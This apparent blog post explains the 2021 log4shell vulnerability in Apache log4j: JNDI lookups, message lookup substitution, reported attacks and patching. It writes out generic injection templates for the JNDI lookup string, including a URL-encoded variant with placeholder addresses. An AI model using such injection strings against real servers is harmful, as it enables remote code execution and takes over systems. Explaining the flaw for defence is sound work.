---
title: "Understanding the log4j global security incident"
date: 2021-12-28T21:24:23+11:00
draft: false
image: img/Post6.jpg
tags: ['Learning', 'Vulnerability']
---

## What is the log4j incident?

Apache log4j is an open-source logging framework used with programming languages. It is a popular framework widely used across various industries, from video games such as Minecraft to hospital equipment and other programs.

Researchers from Alibaba Cloud Security Team discovered a vulnerability in the framework and reported it to Apache on the 24th of November 2021. The vulnerability was then released through a Twitter post to the world on the 9th of December 2021.

This vulnerability with log4j, tracked within the National Vulnerability Database as [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), or more colloquially known as **log4shell**, comes with an ability to remotely execute code, making it very dangerous when used by cyber attackers.

Attackers can exploit the log4j vulnerability to perform a variety of cyber-attacks, such as forcing the server that is running log4j to install any software the attacker wants, including software that can completely take over the server. Within a few days of the exploit being released, cybersecurity company [Akamai Technologies Inc.](https://www.akamai.com/blog/security/threat-intelligence-on-log4j-cve-key-findings-and-their-implications) tracked over **10 million attempts to exploit log4j each hour**.

## Background Information

In Java programming, **logging** is a term to describe keeping records of all data input and output, and any changes made in an application. Logging is simply keeping a record of all the events in an application. It is mainly used by developers for debugging and tracking the history of changes.

A logging framework is usually a third-party application used to help ease and standardise the process of logging information across an application. Apache log4j is a popular and widely-used example of these third-party applications.

The log4j framework can look up information, such as Event lookups, Date lookups or JNDI (Java Naming and Directory Interface) lookups, to name a few examples. It uses the JDNI API to correlate these lookups against different record providers, such as DNS (Domain Name Service), RMI (Remote Method Invocation) or the others seen in the image below. An overview of JDNI can be found [here](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html).

{{< figure src="https://docs.oracle.com/javase/jndi/tutorial/figures/jndi/getStarted/jndiarch.jpg" title="JDNI API. Figure Source: Oracle Documentation" height="500" width="500" >}}

The log4shell vulnerability takes advantage of log4j not performing input validation and not sanitising any URL's passed through input messages. Log4j does not verify the JNDI and LDAP (Lightweight Directory Access Protocol) requests. Therefore, attackers can execute malicious Java code on any server, as log4j blindly trusts all user input.

## How log4j works

Log4j has a feature named **message lookup substitution**. This feature allows log4j to automatically detect strings (meaning text written by users) that point to JDNI resources. Before the latest update, this feature was enabled automatically and was partially responsible for the remote code execution vulnerability that came to be known as log4shell.

The **message lookup substitution** feature in log4j had no in-built rules governing acceptable user input, and as a result would not sanitise and remove any unnecessary input, including URL's. This automatically enabled feature, combined with the lack of input filtering, allowed attackers to send malicious requests to applications using log4j with little effort.

{{< figure src="https://news.sophos.com/wp-content/uploads/2021/12/log4j_how-1.png" title="Log4j Explanied. Figure Source: SophosLabs" height="700" width="700">}}

With HTTP communications specifically, the malicious string could be sent through any part of the HTTP request that would be logged by the receiving application. As seen in the diagram above, the **User-Agent** field in the "Normal Log4j Scenario" would contain the user's browser details. An attacker can modify this information and instead send a string that would invoke the JNDI interface.

This malicious string can be crafted in many ways but was commonly in the form of:

```text
${jndi:[service]://[lookup address]}
```

In this example, JNDI can call upon services such as LDAP, LDAPS, DNS or Java's RMI to assist in the lookup.

The lookup address is the URL that would be queried and fetched as Java code.

Another technique would include URL-encoded payloads. This would look like:

```text
$%7Bjndi:ldap:/x.x.x.x:3339/[malicious exploit]%7D
```

This technique is more straightforward for an attacker to execute and involves replacing characters with UTF-8 encoded characters. The '**{**' bracket is written instead as '**%7B**', for example.

When the receiving server logged this malicious request, the log4j vulnerability would be triggered and the commands crafted by the attacker would be executed.

## What known cyberattacks resulted from log4j?

Since the log4shell vulnerability is relatively simple to exploit, millions of cyber attacks have resulted from it within a few days of it being released.

Microsoft has reported cyberattacks involving attackers installing crypto mining software such as XMRig cryptocurrency miners on servers. Similarly, attackers have also tried to install botnet malware on servers, such as Muhstik botnet, as well as malicious java code that can create and activate a backdoor in a server for attackers to exploit later.

Khonsari and Conti ransomware threats have also been reported, alongside numerous other malware. More information about publicly reported payloads can be found at [Symantec](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/log4j-vulnerabilities-attacks).

The best fix to this vulnerability is to update all servers using Apache Log4j to version 2.15.0 or later, and to continue checking to more future updates as good practice.

Tags:
